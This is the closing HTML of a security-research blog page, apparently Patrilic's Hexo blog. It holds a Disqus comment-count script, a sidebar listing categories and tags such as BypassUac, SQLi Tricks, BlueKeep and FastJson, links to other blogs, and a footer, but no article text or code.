     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://Patrilic.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://patrilic.top"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ATT-CK/">ATT&CK</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BypassUac/">BypassUac</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Diary/">Diary</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java-Sec/">Java_Sec</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pentest-Cheat-Sheet/">Pentest Cheat Sheet</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Red-Team-Tricks/">Red-Team Tricks</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQLi-Tricks/">SQLi Tricks</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Threat-Intelligence/">Threat Intelligence</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/">Write-up</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Ghost-cat/" style="font-size: 15px;">Ghost_cat</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Bypass-CDN/" style="font-size: 15px;">Bypass CDN</a> <a href="/tags/Forcepoint-VPN/" style="font-size: 15px;">Forcepoint VPN</a> <a href="/tags/BlueKeep/" style="font-size: 15px;">BlueKeep</a> <a href="/tags/Windows提权/" style="font-size: 15px;">Windows提权</a> <a href="/tags/DLL-Hijacking/" style="font-size: 15px;">DLL Hijacking</a> <a href="/tags/Potato/" style="font-size: 15px;">Potato</a> <a href="/tags/FastJson/" style="font-size: 15px;">FastJson</a> <a href="/tags/Java反射/" style="font-size: 15px;">Java反射</a> <a href="/tags/JNDI/" style="font-size: 15px;">JNDI</a> <a href="/tags/代码审计/" style="font-size: 15px;">代码审计</a> <a href="/tags/n1ctf-pentest/" style="font-size: 15px;">n1ctf-pentest</a> <a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/SQLi/" style="font-size: 15px;">SQLi</a> <a href="/tags/Backdoor/" style="font-size: 15px;">Backdoor</a> <a href="/tags/内网渗透/" style="font-size: 15px;">内网渗透</a> <a href="/tags/iSoonLab-org/" style="font-size: 15px;">iSoonLab.org</a> <a href="/tags/proc/" style="font-size: 15px;">proc</a> <a href="/tags/反序列化/" style="font-size: 15px;">反序列化</a> <a href="/tags/SQL注入/" style="font-size: 15px;">SQL注入</a> <a href="/tags/RMI/" style="font-size: 15px;">RMI</a> <a href="/tags/Struts2/" style="font-size: 15px;">Struts2</a> <a href="/tags/Commons-Collections/" style="font-size: 15px;">Commons-Collections</a> <a href="/tags/Jackson/" style="font-size: 15px;">Jackson</a> <a href="/tags/文件上传/" style="font-size: 15px;">文件上传</a> <a href="/tags/威胁情报/" style="font-size: 15px;">威胁情报</a> <a href="/tags/Git/" style="font-size: 15px;">Git</a> <a href="/tags/DotNet/" style="font-size: 15px;">DotNet</a> <a href="/tags/命令执行/" style="font-size: 15px;">命令执行</a> <a href="/tags/ClassLoader/" style="font-size: 15px;">ClassLoader</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://balis0ng.com" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://evi1cg.me/" title="evi1cg's Blog" target="_blank">evi1cg's Blog</a><ul></ul><a href="http://hpdoger.cn" title="Hpdoger" target="_blank">Hpdoger</a><ul></ul><a href="http://0day.design" title="Passer6y" target="_blank">Passer6y</a><ul></ul><a href="http://adm1n.design" title="Hu3sky" target="_blank">Hu3sky</a><ul></ul><a href="http://0xa1paca.top" title="0xa1paca" target="_blank">0xa1paca</a><ul></ul><a href="http://noel.xin/" title="Noel's Blog" target="_blank">Noel's Blog</a><ul></ul><a href="https://www.0akarma.com" title="0aKarmA" target="_blank">0aKarmA</a><ul></ul><a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a><ul></ul><a href="https://www.kingkk.com/" title="Kingkk's Blog" target="_blank">Kingkk's Blog</a><ul></ul><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a><ul></ul><a href="http://r3start.net/" title="R3start" target="_blank">R3start</a><ul></ul><a href="https://zgao.top" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://b1eed.github.io/" title="1x2Bytes" target="_blank">1x2Bytes</a><ul></ul><a href="http://www.free04k.cn/" title="free04k" target="_blank">free04k</a><ul></ul><a href="http://hl0rey.github.io/" title="hl0rey" target="_blank">hl0rey</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">Patrilic's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>